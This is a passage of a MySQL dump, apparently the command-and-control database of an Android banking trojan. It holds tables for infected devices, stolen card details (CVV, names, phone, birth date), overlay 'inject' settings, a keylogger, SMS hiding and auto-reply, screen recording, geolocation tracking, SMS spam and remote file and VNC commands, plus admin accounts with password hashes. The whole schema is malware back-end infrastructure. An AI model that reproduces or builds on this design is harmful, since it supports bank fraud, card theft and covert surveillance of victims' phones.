  `cvv` varchar(5) DEFAULT NULL,
  `otvet2` varchar(100) DEFAULT NULL,
  `f_name` varchar(100) DEFAULT NULL,
  `l_name` varchar(100) DEFAULT NULL,
  `phone` varchar(35) DEFAULT NULL,
  `dateBrith` varchar(15) DEFAULT NULL,
  `logs` varchar(3000) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `kliets`
--

CREATE TABLE `kliets` (
  `id` int(255) UNSIGNED NOT NULL,
  `IMEI` varchar(300) NOT NULL,
  `number` varchar(300) DEFAULT NULL,
  `version` varchar(100) NOT NULL,
  `country` varchar(30) DEFAULT NULL,
  `bank` varchar(500) DEFAULT NULL,
  `model` varchar(50) DEFAULT NULL,
  `lastConnect` varchar(30) NOT NULL,
  `firstConnect` varchar(30) NOT NULL,
  `inj` varchar(2) DEFAULT NULL,
  `l_bank` varchar(2) DEFAULT NULL,
  `log` varchar(2) DEFAULT NULL,
  `r00t` varchar(10) DEFAULT NULL,
  `screen` varchar(10) DEFAULT NULL,
  `version_apk` varchar(20) DEFAULT NULL,
  `color` varchar(20) DEFAULT NULL,
  `av` varchar(500) DEFAULT NULL,
  `requestInjProc` int(5) DEFAULT NULL,
  `requestGeoloc` int(5) DEFAULT NULL,
  `requestSMS` int(5) DEFAULT NULL,
  `seconds` varchar(50) DEFAULT NULL,
  `accessibility` varchar(5) DEFAULT NULL,
  `playprotect` varchar(10) DEFAULT NULL,
  `doze` varchar(10) DEFAULT NULL,
  `ip` varchar(20) DEFAULT NULL,
  `step` varchar(500) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `kliets`
--

INSERT INTO `kliets` (`id`, `IMEI`, `number`, `version`, `country`, `bank`, `model`, `lastConnect`, `firstConnect`, `inj`, `l_bank`, `log`, `r00t`, `screen`, `version_apk`, `color`, `av`, `requestInjProc`, `requestGeoloc`, `requestSMS`, `seconds`, `accessibility`, `playprotect`, `doze`, `ip`, `step`) VALUES
(5, '111111', '22222', '3', 'us', NULL, NULL, '2018-12-2 14:06:00', '2018-12-2 02:01:47', NULL, NULL, NULL, NULL, NULL, '2', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1'),
(6, '111', 'fhdfghdfhdfh', 'dffgdfg', 'ru', NULL, NULL, '2018-5-5 15:15', '2018-5-5 15:15', NULL, NULL, NULL, NULL, NULL, '3', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '4234'),
(7, '11sfsf1', 'fhdfghdfhdfh', 'dffgdfg', 'ru', NULL, NULL, '2018-5-5 15:15', '2018-5-5 15:15', NULL, NULL, NULL, NULL, NULL, '3', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2'),
(8, '111sfdgsdg', 'fhdfghdfhdfh', 'dffgdfg', 'ru', NULL, NULL, '2018-5-5 15:15', '2018-5-5 15:15', NULL, NULL, NULL, NULL, NULL, '2', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '434234');

-- --------------------------------------------------------

--
-- Table structure for table `markers`
--

CREATE TABLE `markers` (
  `id` int(11) NOT NULL,
  `name` varchar(60) NOT NULL,
  `lat` float(10,6) NOT NULL,
  `lng` float(10,6) NOT NULL,
  `type` varchar(30) NOT NULL,
  `provayder` varchar(30) DEFAULT NULL,
  `time` varchar(30) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--

CREATE TABLE `settings` (
  `id` int(60) UNSIGNED NOT NULL,
  `IMEI` varchar(1000) NOT NULL,
  `inject` varchar(3000) DEFAULT NULL,
  `del_sms` varchar(3000) DEFAULT NULL,
  `state` varchar(5) DEFAULT NULL,
  `avtootvet_num` varchar(50) DEFAULT NULL,
  `avtootvet_sig1` varchar(3000) DEFAULT NULL,
  `avtootvet_sig2` varchar(3000) DEFAULT NULL,
  `avtootvet_true` varchar(5) DEFAULT NULL,
  `checkforeground` varchar(10) DEFAULT NULL,
  `keylogger` varchar(10) DEFAULT NULL,
  `checkrecord` varchar(10) DEFAULT NULL,
  `recordseconds` varchar(50) DEFAULT NULL,
  `lookscreen` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `settingsall`
--

CREATE TABLE `settingsall` (
  `id` int(10) UNSIGNED NOT NULL,
  `hash` varchar(500) DEFAULT NULL,
  `intInterval` varchar(50) DEFAULT NULL,
  `checksms` varchar(5) DEFAULT NULL,
  `checkhidesms` varchar(5) DEFAULT NULL,
  `checkgeolocation` varchar(5) DEFAULT NULL,
  `checkInjectionsApps` varchar(10) DEFAULT NULL,
  `secondInjectionsApps` varchar(250) DEFAULT NULL,
  `checkRequestGeolocation` varchar(10) DEFAULT NULL,
  `secondRequestGeolocation` varchar(250) DEFAULT NULL,
  `checkGrab_auto` varchar(10) DEFAULT NULL,
  `Grab_auto` varchar(1000) DEFAULT NULL,
  `secondGrab_auto` varchar(200) DEFAULT NULL,
  `checkInjGrab` varchar(10) DEFAULT NULL,
  `InjGrab` varchar(6000) DEFAULT NULL,
  `secondInjGrab` varchar(250) DEFAULT NULL,
  `checkPhoneContacts` varchar(10) DEFAULT NULL,
  `secondPhoneContacts` varchar(250) DEFAULT NULL,
  `checkStartGeolocation` varchar(10) DEFAULT NULL,
  `secondStartGeolocation` varchar(250) DEFAULT NULL,
  `urls` varchar(4000) CHARACTER SET armscii8 DEFAULT NULL,
  `urlInj` varchar(3000) DEFAULT NULL,
  `findfiles` varchar(2000) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `settingsall`
--

INSERT INTO `settingsall` (`id`, `hash`, `intInterval`, `checksms`, `checkhidesms`, `checkgeolocation`, `checkInjectionsApps`, `secondInjectionsApps`, `checkRequestGeolocation`, `secondRequestGeolocation`, `checkGrab_auto`, `Grab_auto`, `secondGrab_auto`, `checkInjGrab`, `InjGrab`, `secondInjGrab`, `checkPhoneContacts`, `secondPhoneContacts`, `checkStartGeolocation`, `secondStartGeolocation`, `urls`, `urlInj`, `findfiles`) VALUES
(1, '77T5dSD6GQknN47', '14000', '1', '', '', '', '', '', '', '1', '', '10', '1', '|2|8|15|16|17', '6700', '', '', '', '', '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `smsspam`
--

CREATE TABLE `smsspam` (
  `id` int(255) NOT NULL,
  `number` varchar(20) CHARACTER SET utf8 NOT NULL,
  `status` varchar(5) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `t_users`
--

CREATE TABLE `t_users` (
  `id` int(255) NOT NULL,
  `login` varchar(500) NOT NULL,
  `password` varchar(500) NOT NULL,
  `right_` varchar(20) NOT NULL,
  `status` varchar(20) NOT NULL,
  `tag` varchar(1500) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `t_users`
--

INSERT INTO `t_users` (`id`, `login`, `password`, `right_`, `status`, `tag`) VALUES
(34, 'admin', 'b34912e584b42722ddbb7f6a17705be0', 'admin', 'Action', ''),
(35, 'user', '574146ee002e87444a5208f7391f85bf', 'user', 'Action', '2'),
(36, 'user1', '7acedb3ae819effe9f26d7d15df5188f', 'user', 'Action', ''),
(37, 'traf', '7d628eb1775fe1f6d09d8ab8e2029ae7', 'traffic', 'Action', '');

-- --------------------------------------------------------

--
-- Table structure for table `ws`
--

CREATE TABLE `ws` (
  `id` int(11) NOT NULL,
  `lastconnect` varchar(100) DEFAULT NULL,
  `botid` varchar(50) DEFAULT NULL,
  `command` varchar(200) DEFAULT NULL,
  `statusserver` int(2) DEFAULT NULL,
  `path` varchar(400) DEFAULT NULL,
  `FileFolder` varchar(3000) DEFAULT NULL,
  `statusfilefolder` varchar(2) DEFAULT NULL,
  `DownloadFile` varchar(2500) DEFAULT NULL,
  `vncscreen` varchar(20) DEFAULT NULL,
  `sound` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `ws`
--

INSERT INTO `ws` (`id`, `lastconnect`, `botid`, `command`, `statusserver`, `path`, `FileFolder`, `statusfilefolder`, `DownloadFile`, `vncscreen`, `sound`) VALUES
(1, '', '', 'opendir:getExternalStorageDirectory', 1, '', '!!!!path1||!!!!file1.txt||!!!', '0', NULL, '0.jpg', '1');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `cc`
--
ALTER TABLE `cc`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `commands`
--
ALTER TABLE `commands`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`);

--
-- Indexes for table `idbotwindows`
--
ALTER TABLE `idbotwindows`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `injection`
--
ALTER TABLE `injection`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `injs`
--
ALTER TABLE `injs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `kliets`
--
ALTER TABLE `kliets`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`),
  ADD KEY `id_2` (`id`);

--
-- Indexes for table `markers`
--
ALTER TABLE `markers`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `settingsall`
--
ALTER TABLE `settingsall`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `smsspam`
--
ALTER TABLE `smsspam`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `t_users`
--
ALTER TABLE `t_users`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ws`
--
ALTER TABLE `ws`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `cc`
--
ALTER TABLE `cc`
  MODIFY `id` int(255) UNSIGNED NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `commands`
--
ALTER TABLE `commands`
  MODIFY `id` int(255) UNSIGNED NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `idbotwindows`
--
ALTER TABLE `idbotwindows`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT for table `injection`
--
ALTER TABLE `injection`
  MODIFY `id` int(60) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1161;
--
-- AUTO_INCREMENT for table `injs`
--
ALTER TABLE `injs`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;
--
-- AUTO_INCREMENT for table `kliets`
--
ALTER TABLE `kliets`
  MODIFY `id` int(255) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;
--
-- AUTO_INCREMENT for table `markers`
--
ALTER TABLE `markers`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=197;
--
-- AUTO_INCREMENT for table `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(60) UNSIGNED NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `settingsall`
--
ALTER TABLE `settingsall`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `smsspam`
--
ALTER TABLE `smsspam`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `t_users`
--
ALTER TABLE `t_users`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=38;
--
-- AUTO_INCREMENT for table `ws`
--
ALTER TABLE `ws`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
